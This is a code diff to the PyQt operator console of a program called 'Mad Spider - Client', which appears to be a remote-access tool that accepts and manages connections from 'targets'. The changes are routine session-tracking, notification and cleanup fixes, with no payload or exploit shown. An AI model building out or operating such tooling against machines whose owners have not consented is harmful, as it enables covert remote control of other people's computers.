@@ -140,6 +140,8 @@ class MainDialog(QWidget, gui.Ui_Form):
 
             # Close all connection and terminate socket
             self.acceptthreadState = False
+
+            # Make Last connection for terminate thread
             try:
                 self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.shd.connect(('127.0.0.1', self.port))
@@ -147,7 +149,6 @@ class MainDialog(QWidget, gui.Ui_Form):
             except:
                 pass
             if self.active:
-                self.socks[self.sockind].close()
                 self.active = False
                 self.c.close()
 
@@ -219,16 +220,16 @@ class MainDialog(QWidget, gui.Ui_Form):
                 # Save connected address
                 self.sockItems += [self.a]
 
+                self.trayIcon.showMessage('New Connection', 'From {}'.format(self.a[0]), self.lineno())
+
                 # Add connection to servers list
                 self.socketListUpdate()
 
-                self.statusok('New connection from {}'.format(str(self.sockItems[self.sockind])), self.lineno())
-                self.trayIcon.showMessage('New Connection', 'From {}'.format(str(self.sockItems[self.sockind])), self.lineno())
 
     def socketListUpdate(self):
         self.socketsList.clear()
-        for index, __sock__ in enumerate(self.sockItems):
-            row = QListWidgetItem('[-%s-] %s' % (str(index), __sock__))
+        for __sock__ in self.sockItems:
+            row = QListWidgetItem(' %s ' % str(__sock__))
             row.setIcon(QIcon(r'assets/tick.png'))
             self.socketsList.addItem(row)
             self.clientscountLabel.setText(str(self.socketsList.count()))
@@ -246,7 +247,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         # Ask Password
         while 1:
-            if self.sockind not in self.unlockedSocks:
+            if self.sockItems[self.sockind] not in self.unlockedSocks:
                 dlg = QInputDialog(self)
                 dlg.setInputMode(QInputDialog.TextInput)
                 dlg.setWindowTitle('Password Protection')
@@ -278,7 +279,7 @@ class MainDialog(QWidget, gui.Ui_Form):
                         self.displayText(msg=self.data.split('[ENDOFMESSAGE]')[0])
                         self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
                         self.tabWidget.setEnabled(True)
-                        self.unlockedSocks.append(self.sockind)
+                        self.unlockedSocks.append(self.sockItems[self.sockind])
                         break
             except socket.error:
                 self.statusno('Error while recieve message from target', self.lineno())
@@ -302,8 +303,6 @@ class MainDialog(QWidget, gui.Ui_Form):
             self.tabWidget.setCurrentIndex(0)
             self.displayText(msg='<br><br><p align="center"><font size=42 color=red>Connection Lost</font></p>',
                             error='Disconected')
-            print self.sockItems
-            print self.sockItems[0]
 
     # while close program, connect himself for shutdown socket
     def closeEvent(self, event):
